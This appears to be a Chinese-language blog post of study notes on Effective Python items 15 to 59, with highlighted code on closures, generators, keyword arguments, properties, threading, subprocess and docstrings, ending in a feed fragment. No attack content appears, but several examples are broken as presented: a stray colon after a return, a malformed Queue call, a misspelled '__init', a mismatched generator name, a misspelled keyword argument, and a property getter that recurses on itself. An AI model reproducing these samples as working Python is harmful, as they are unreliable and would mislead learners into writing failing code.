<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">a, b</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">return</span> a / b</span><br><span class="line">	<span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">x,y = <span class="number">0</span>, <span class="number">5</span></span><br><span class="line">result = divide(x, y)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Invaid inputs&#x27;</span>) <span class="comment"># This is WRONG !</span></span><br></pre></td></tr></table></figure>

<p>改进方法一： 把返回值拆两部分，例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">a, b</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span>, a / b</span><br><span class="line">	<span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>改进方法二：给上一级抛异常</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">a, b</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">return</span> a / b:</span><br><span class="line">	<span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid inputs&#x27;</span>) <span class="keyword">from</span> e</span><br></pre></td></tr></table></figure>

<h2><span id="15-了解如何在闭包里使用外围作用域中的变量">15. 了解如何在闭包里使用外围作用域中的变量</span></h2><p>使用nonlocal获取闭包内的数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sort_priority3</span>(<span class="params">numbers, group</span>):</span><br><span class="line">	found = <span class="literal">False</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">helper</span>(<span class="params">x</span>):</span><br><span class="line">		<span class="keyword">nonlocal</span> found</span><br><span class="line">		<span class="keyword">if</span> x <span class="keyword">in</span> group:</span><br><span class="line">			found = <span class="literal">True</span></span><br><span class="line">			<span class="keyword">return</span> (<span class="number">0</span>, x)</span><br><span class="line">		<span class="keyword">return</span> (<span class="number">1</span>, x)</span><br><span class="line">	numbers.sort(key=helper)</span><br><span class="line">	<span class="keyword">return</span> found</span><br></pre></td></tr></table></figure>

<h2><span id="16-用生成器改写直接返回列表函数">16. 用生成器改写直接返回列表函数</span></h2><p>这种写法的问题是，返回前要把所有结果放在列表里，如果输入量非常大，程序可能耗尽内存崩溃</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index_words</span>(<span class="params">text</span>):</span><br><span class="line">	result = []</span><br><span class="line">	<span class="keyword">if</span> text:</span><br><span class="line">		result.append(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> index, letter <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">		<span class="keyword">if</span> letter == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">			result.append(index + <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">address = <span class="string">&#x27;Four score and seven years ago...&#x27;</span></span><br><span class="line">result = index_words(address)</span><br><span class="line"><span class="built_in">print</span>(result[:<span class="number">3</span>])</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">[<span class="number">0</span>, <span class="number">5</span>, <span class="number">11</span>]</span><br></pre></td></tr></table></figure>

<p>用生成器改写会更好，生成器用yield表达式函数，调用生成器函数时，不会真的运行，而是返回迭代器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index_word_iter</span>(<span class="params">text</span>):</span><br><span class="line">	<span class="keyword">if</span> text:</span><br><span class="line">		<span class="keyword">yield</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> index, letter <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">		<span class="keyword">if</span> letter == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">			<span class="keyword">yield</span> index + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">address = <span class="string">&#x27;Four score and seven years ago...&#x27;</span></span><br><span class="line">result = <span class="built_in">list</span>(index_words_iter(address))</span><br><span class="line">[<span class="number">0</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">27</span>]</span><br></pre></td></tr></table></figure>

<h2><span id="17-在参数上迭代时多加小心">17. 在参数上迭代时，多加小心</span></h2><p>函数在输入参数上多次迭代时要当心，如果参数是迭代器，可能导致奇怪的行为并错失某些值</p>
<h2><span id="18-用数量可变位置参数减少视觉杂讯-visual-noise">18. 用数量可变位置参数减少视觉杂讯 (visual noise)</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">message, *values</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> values:</span><br><span class="line">		<span class="built_in">print</span>(message)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		values_str = <span class="string">&#x27;, &#x27;</span>.join(<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> values)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (message, values_str))</span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;My numbers are&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">log(<span class="string">&#x27;Hi there&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>要点：</p>
<ul>
<li>def语句中使用*args, 即可令函数接收数量可变的位置参数</li>
<li>在已经接收*args参数的函数上继续添加位置参数，可能产生难以排查的BUG</li>
</ul>
<h2><span id="19-用关键字参数表达可选的行为">19. 用关键字参数表达可选的行为</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">remainder</span>(<span class="params">number, divisor</span>):</span><br><span class="line">	<span class="keyword">return</span> number % divisor</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>下面这些调用，都是等效的</span><br><span class="line">remainder(<span class="number">20</span>, <span class="number">7</span>)</span><br><span class="line">remainder(<span class="number">20</span>, divisor=<span class="number">7</span>)</span><br><span class="line">remainder(number=<span class="number">20</span>, divisor=<span class="number">7</span>)</span><br><span class="line">remainder(ivisor=<span class="number">7</span>, number=<span class="number">20</span>)</span><br></pre></td></tr></table></figure>

<p>灵活使用关键字参数，提供如下好处：</p>
<ul>
<li>更容易理解含义</li>
<li>在函数定义中提供默认值，使代码简洁</li>
</ul>
<h2><span id="20-用none和文档字符串描述含有动态默认值的参数">20. 用None和文档字符串描述含有动态默认值的参数</span></h2><p>参数默认值，只会在程序加载模块并读到本函数的定义时评估一次，对于{}或[]等动态的值，这可能会导致奇怪的行为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">data, default=&#123;&#125;</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">return</span> json.loads(data)</span><br><span class="line">	<span class="keyword">except</span> ValueError:</span><br><span class="line">		<span class="keyword">return</span> default</span><br><span class="line"></span><br><span class="line">foo = decode(<span class="string">&#x27;bad data&#x27;</span>)</span><br><span class="line">foo[<span class="string">&#x27;stuff&#x27;</span>] = <span class="number">5</span></span><br><span class="line">bar = decode(<span class="string">&#x27;also bad&#x27;</span>)</span><br><span class="line">bar[<span class="string">&#x27;meep&#x27;</span>] = <span class="number">1</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Foo: &#123;<span class="string">&#x27;stuff&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;meep&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">Bar: &#123;<span class="string">&#x27;stuff&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;meep&#x27;</span>: <span class="number">1</span>&#125; <span class="comment"># Wrong</span></span><br></pre></td></tr></table></figure>

<p>解决方法是，把关键字参数默认设置为None，并在文档字符串中描述它的行为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">data, default=<span class="literal">None</span></span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot; Load JSON data from a string</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Args:</span></span><br><span class="line"><span class="string">		data: JSON data to decode</span></span><br><span class="line"><span class="string">		default: Value to return if decoding fails, Defaults to an empty dictionary</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> default <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        default = &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> json.loads(data)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> default</span><br></pre></td></tr></table></figure>

<h2><span id="21-用只能以关键字形式指定的参数来确保代码明晰">21. 用只能以关键字形式指定的参数来确保代码明晰</span></h2><h1><span id="第3章-类与继承">第3章 类与继承</span></h1><h2><span id="22-尽量用辅助类维护程序状态而不要用字典和元组">22. 尽量用辅助类维护程序状态，而不要用字典和元组</span></h2><ul>
<li>不要使用包含其他字典的字典，也不要使用过长的元组</li>
<li>如果容器中包含简单而又不可变的数据，可先使用namedtuple表示，后有需要再修改为类</li>
<li>保存内部状态的字典如果比较复杂，应该把代码拆解为辅助类</li>
</ul>
<h2><span id="23-简单的接口应该接受函数而不是类的实例">23. 简单的接口应该接受函数，而不是类的实例</span></h2><p>Python有许多内置API，允许调用者传入函数，以定制其行为，例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>names = [<span class="string">&#x27;Socrates&#x27;</span>, <span class="string">&#x27;Archimedes&#x27;</span>, <span class="string">&#x27;Plato&#x27;</span>, <span class="string">&#x27;Aristotle&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>names.sort(key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(names)</span><br><span class="line">[<span class="string">&#x27;Plato&#x27;</span>, <span class="string">&#x27;Socrates&#x27;</span>, <span class="string">&#x27;Aristotle&#x27;</span>, <span class="string">&#x27;Archimedes&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>其他编程语言可能用抽象类定义挂钩，然而在Python中，很多挂钩只是无状态函数，这些函数有明确参数和返回值。用函数做挂钩，比定义一个类要简单</p>
<h2><span id="24-以classmethod形式的多态去通用地构建对象">24. 以@classmethod形式的多态去通用地构建对象</span></h2><p>通过@classmethod机制，可以用一种与构造器相仿的方式构造类的对象</p>
<h2><span id="25-用super初始化父类">25. 用super初始化父类</span></h2><ul>
<li>直接调用父类的__init__方法，在多重继承影响下，可能产生无法预知行为</li>
<li>总是应该使用内置的super函数初始化父类</li>
</ul>
<h2><span id="26-只在使用mix-in组件制作工具类时进行多重继承">26. 只在使用Mix-in组件制作工具类时进行多重继承</span></h2><h2><span id="27-多用public属性少用private属性">27. 多用public属性，少用private属性</span></h2><ul>
<li>Python编译器无法严格保证private字段私密性，用经典的格言来说：“we are all consenting adults here”，大家都认为开放比封闭更好</li>
<li>只有子类不受自己控制时，才可以考虑用private属性来避免名称冲突</li>
</ul>
<h2><span id="28-继承collectionsabc以实现自定义的容器类型">28. 继承collections.abc以实现自定义的容器类型</span></h2><p>编写自制容器类型，可以从内置collections.abc模块的抽象基类中继承。从这样的基类继承了子类后，如果忘记实现某个方法，那么collections.abc模块会指出这个错误：</p>
<pre><code>from collections.abc import Sequence
class BadType(Sequence):
    pass
foo = BadType()
&gt;&gt;&gt;
TypeError: Can&#39;t instantiate abstract class BadType with ...
</code></pre>
<h1><span id="第4章-元素与属性">第4章 元素与属性</span></h1><h2><span id="29-用纯属性取代get和set方法">29. 用纯属性取代get和set方法</span></h2><p>从其他语言转入Python的开发者，可能会在类中明确实现getter, setter，但这种做法不像Python编程风格</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OldResistor</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ohms</span>):</span><br><span class="line">        <span class="variable language_">self</span>._ohms = ohms</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ohms</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._ohms</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_ohms</span>(<span class="params">self, ohms</span>):</span><br><span class="line">        <span class="variable language_">self</span>._ohms = ohms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = OldResistor(<span class="number">50e3</span>)</span><br><span class="line"><span class="built_in">print</span>(obj.get_ohms())</span><br></pre></td></tr></table></figure>

<p>但是，对Python来说，不需要手工实现setter和getter，而是直接用public属性，这样原地自增操作变得清晰自然</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Resistor</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init</span>(<span class="params">self, ohms</span>):</span><br><span class="line">		<span class="variable language_">self</span>.ohms = ohms</span><br><span class="line">r1 = Resistor(<span class="number">50e3</span>)</span><br><span class="line">r1.ohms += <span class="number">5e3</span></span><br></pre></td></tr></table></figure>

<h2><span id="30-考虑用property代替属性重构">30. 考虑用@property代替属性重构</span></h2><p>Python内置的@property装饰器负责把一个方法变成属性调用</p>
<p>例，使用@property既能检查参数，又可以用类似属性这样简单方法访问类的变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">score</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.score</span><br><span class="line"></span><br><span class="line"><span class="meta">    @score.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">score</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, <span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;score must be an int!&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">0</span> <span class="keyword">or</span> value &gt; <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;score must between 0 ~ 100&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>._score = value</span><br><span class="line"></span><br><span class="line">s = Student()</span><br><span class="line">s.score = <span class="number">60</span></span><br><span class="line">s.score = <span class="number">10000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>python test.py</span><br><span class="line">ValueError: score must between <span class="number">0</span> ~ <span class="number">100</span></span><br></pre></td></tr></table></figure>

<h2><span id="31-用描述符来改写需要复用的property方法">31. 用描述符来改写需要复用的@property方法</span></h2><h2><span id="32-用getattr-getattribute-setattr实现按需生成操作-惰性方式加载并保存对象属性">32. 用getattr, getattribute, setattr实现按需生成操作 (惰性方式加载并保存对象属性）</span></h2><ul>
<li>如果某个类定义了__getattr__，同时系统在该类对象实例字典中找不到待查属性，那么，系统就会调用这个方法</li>
<li>程序每次访问对象属性，Python系统会调用__getattribute__</li>
</ul>
<h2><span id="33-用元类验证子类">33. 用元类验证子类</span></h2><h2><span id="34-用元类注册子类">34. 用元类注册子类</span></h2><h1><span id="第5章-并发及并行">第5章 并发及并行</span></h1><h2><span id="36-用subprocess模块管理子进程">36. 用subprocess模块管理子进程</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">proc = subprocess.Popen([<span class="string">&#x27;echo&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>], stdout=subprocess.PIPE)</span><br><span class="line">out, err = proc.communicate()</span><br><span class="line"><span class="built_in">print</span>(out.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>把子进程从父进程中剥离</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_sleep</span>(<span class="params">period</span>):</span><br><span class="line">    proc = subprocess.Popen([<span class="string">&#x27;sleep&#x27;</span>, <span class="built_in">str</span>(period)])</span><br><span class="line">    <span class="keyword">return</span> proc</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line">procs = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    proc = run_sleep(<span class="number">0.1</span>)</span><br><span class="line">    procs.append(proc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> proc <span class="keyword">in</span> procs:</span><br><span class="line">    proc.communicate()</span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Finished in %.3f seconds&#x27;</span> % (end - start))</span><br></pre></td></tr></table></figure>

<h2><span id="37-可以用线程执行阻塞式io但不要用它做并行计算">37. 可以用线程执行阻塞式IO，但不要用它做并行计算</span></h2><ul>
<li>受到全局解释器锁（GIL）限制，多条Python线程不能在多个CPU核心上平行地执行字节码</li>
</ul>
<h2><span id="38-在线程中使用lock来防止数据竞争">38. 在线程中使用Lock来防止数据竞争</span></h2><ul>
<li>GIL不会保护开发者自己代码， 同一时刻固然只能有一个Python线程运行，但这个线程正在操作某个数据结构时，其他线程可能会打断它，也就是说Python解释器来执行两个连续字节码指令时，其他线程可能会中途插进来。</li>
</ul>
<p>threading.Lock类实现了互斥锁</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LockingCounter</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="variable language_">self</span>.lock = Lock()</span><br><span class="line">		<span class="variable language_">self</span>.count = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment</span>(<span class="params">self, offset</span>):</span><br><span class="line">		<span class="keyword">with</span> <span class="variable language_">self</span>.lock:</span><br><span class="line">			<span class="variable language_">self</span>.count += offset</span><br></pre></td></tr></table></figure>

<h2><span id="39-用queue协调各线程之间的工作">39. 用Queue协调各线程之间的工作</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = Queue.Queue(<span class="number">10</span>=</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">producer</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        q.put(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consumer</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="built_in">print</span>(q.get())</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=consumer)</span><br><span class="line">t2 = threading.Thread(target=producer)</span><br></pre></td></tr></table></figure>

<h2><span id="40考虑用协程并发地运行多个函数">40.考虑用协程并发地运行多个函数</span></h2><ul>
<li>对于生成器的yield表达式来说，外部代码通过send方法传给生成器的那个值，就是该表达式所具备的值</li>
</ul>
<h2><span id="x2041-考虑用concurrentfutures实现平行计算">&#x20;41. 考虑用concurrent.futures实现平行计算</span></h2><ul>
<li>multiprocessing模块可用于实现平行计算，利用multiprocessing模块最恰当做法，是通过内置concurrent.futures模块及其ProcessPoolExecutor类使用它</li>
</ul>
<h1><span id="第6章-内置模块">第6章 内置模块</span></h1><h2><span id="x2042-用functoolswraps定义函数修饰器">&#x20;42. 用functools.wraps定义函数修饰器</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">trace</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s(%r, %r) -&gt; %r&#x27;</span> % (func.__name__, args, kwargs, result))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@trace</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fibonacci</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> fibonacci(n - <span class="number">2</span>) + fibonacci(n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fibonacci(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li>Python为修饰器提供专门语法，使得程序运行时，能用一个函数修改另一个函数</li>
</ul>
<h2><span id="43-考虑以contextlib和with语句改写可复用的tryx2ffinally代码">43. 考虑以contextlib和with语句改写可复用的try&#x2F;finally代码</span></h2><p>用with语句代替try… finally，例如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.read()</span><br></pre></td></tr></table></figure>

<h2><span id="44-用copyreg实现可靠pickle操作">44. 用copyreg实现可靠pickle操作</span></h2><p>内置的pickle模块能够将Python对象字节序列转化为字节流，也能把字节反序列化成Python对象</p>
<h2><span id="45-使用datatime模块处理本地时间而不是time">45. 使用datatime模块处理本地时间而不是time</span></h2><ul>
<li>不要用time模块在不同时区进行转换</li>
<li>开发者总是应该先把时间表示成UTC，然后对其转换，最后再转回本地时间</li>
</ul>
<h2><span id="46-使用内置算法和数据结构">46. 使用内置算法和数据结构</span></h2><ul>
<li>双向队列 deque</li>
<li>有序字典 OrderedDict (按照键插入顺序，保留键值对在字典中次序）</li>
<li>优先级队列 heapq</li>
<li>二分查找 bisect</li>
<li>迭代器有关 itertools</li>
</ul>
<h2><span id="47重视精确度场合应该使用decimal">47.重视精确度场合，应该使用decimal</span></h2><p>Decimal类适合用在对精度要求高，对舍入行为要求严格的场合，例如：涉及货币计算的场合</p>
<h2><span id="48-学会安装由python开发者社区构建的模块x20">48. 学会安装由Python开发者社区构建的模块&#x20;</span></h2><ul>
<li>PyPI (Python Package Index) 包含许多常用软件包， pip命令行工具可以从PyPI中安装软件包</li>
</ul>
<h1><span id="第7章-协作开发">第7章 协作开发</span></h1><h2><span id="49-为每个函数-类和模块编写文档字符串">49. 为每个函数、类和模块编写文档字符串</span></h2><p><strong>为模块编写文档</strong></p>
<ul>
<li>每个模块应该有顶级的docstring</li>
<li>头一行文字，用一句话描述本模块用途，接着一段话包含一些细节信息，把与本模块操作相关内容，告诉模块使用者。</li>
<li>还可以在模块的dockstring中，强调本模块里比较重要类和函数，使开发者据此了解该模块用法</li>
</ul>
<p>举例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># words.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; Library for XXX...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Testing how words XXX...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Available functions:</span></span><br><span class="line"><span class="string"> - palindrome: Determine if a word ...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>为类编写文档</strong></p>
<p>每一个类应该有docstring，写法与模块级的docstring大致相同，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;Represents a player of the game.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Subclassses may override ...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Public attributes:</span></span><br><span class="line"><span class="string">	- power: ...</span></span><br><span class="line"><span class="string">	- coins: ...</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>为函数编写文档</strong></p>
<p>函数的docstring，第一行用一句话描述函数功能，接下来用一段话描述具体行为和函数参数。 若函数由返回值，应该在docstring中写明</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_anagrams</span>(<span class="params">word, dictionary</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;Find all anagrams for a word.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	This function only runs as fast as the test for membership in the dictionary container...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Args:</span></span><br><span class="line"><span class="string">		word: String of the target word.</span></span><br><span class="line"><span class="string">		dictionary: Container with all strings that are known to be actual words.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Returns:</span></span><br><span class="line"><span class="string">		List of anagrams that were found. Empty if none were found.</span></span><br></pre></td></tr></table></figure>
<p>作者的建议：</p>
<ul>
<li>如果函数没有参数，仅有一个简单返回值，那么只需一句话描述该函数就够了</li>
<li>如果函数没有返回值，不要在docstring里提及，不要出现return None这种说法</li>
<li>如果正常使用中不会抛异常，就不要在docstring提到异常</li>
<li>如果函数接收可变参数，应该在文档中描述*args, **kwargs用途</li>
<li>如果函数参数有默认值，应该指出这些默认值</li>
</ul>
<h2><span id="50-用包安排模块并提供稳固api">50. 用包安排模块，并提供稳固API</span></h2><p>在目录中放入名为__init__.py的空文件，就可以采用相对于该目录的路径，引入目录中其他Python文件，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main.py</span><br><span class="line">mypackage/__init__.py</span><br><span class="line">mypackage/utils.py</span><br></pre></td></tr></table></figure>

<p>在main.py中引入utils模块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="keyword">from</span> mypackage <span class="keyword">import</span> utils</span><br></pre></td></tr></table></figure>

<p><strong>as子句可以给引入当前作用域的属性重新起名，解决冲突</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> analysis.utils <span class="keyword">import</span> inspect <span class="keyword">as</span> analysis_inspect</span><br><span class="line"><span class="keyword">from</span> frontend.utils <span class="keyword">import</span> inspect <span class="keyword">as</span> frontend_inspect</span><br></pre></td></tr></table></figure>

<p>尽量不要使用import *语句，而是应该用from x import y，明确指出自己想要引入的名称</p>
<h2><span id="51-为自编的模块定义根异常以便将调用者与api隔离">51. 为自编的模块定义根异常，以便将调用者与API隔离</span></h2><h2><span id="52-用适当方式打破循环依赖关系">52. 用适当方式打破循环依赖关系</span></h2><ul>
<li>如果两个模块必须相互调用对方，才能完成引入操作，就会出现循环依赖现象，这可能导致程序启动时崩溃</li>
<li>打破循环依赖关系最佳方案，是把导致两个模块互相依赖的那部分代码，重构为单独模块，并把它放在依赖树底部</li>
</ul>
<h2><span id="53-用虚拟环境隔离项目并重建其依赖关系">53. 用虚拟环境隔离项目，并重建其依赖关系</span></h2><h1><span id="x20第8章-部署">&#x20;第8章 部署</span></h1><h2><span id="54-考虑用模块级别代码配置不同部署环境x20">54. 考虑用模块级别代码配置不同部署环境&#x20;</span></h2><h2><span id="55-通过repr字符串输出调试信息">55. 通过repr字符串输出调试信息</span></h2><p>简单的print不能打印出值的类型信息，可以用repr获取类型信息</p>
<h2><span id="56-用unittest测试全部代码">56. 用unittest测试全部代码</span></h2><h2><span id="57-用pdb实现交互调试">57. 用pdb实现交互调试</span></h2><p><a href="https://docs.python.org/zh-cn/3/library/pdb.html">https://docs.python.org/zh-cn/3/library/pdb.html</a></p>
<h2><span id="58-先分析性能然后再优化">58. 先分析性能，然后再优化</span></h2><h2><span id="59-用tracemalloc掌握内存使用和泄漏情况">59. 用tracemalloc掌握内存使用和泄漏情况</span></h2>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>RHEL9 Fatal glibc error, CPU does not support x86-64-v2 解决方法</title>
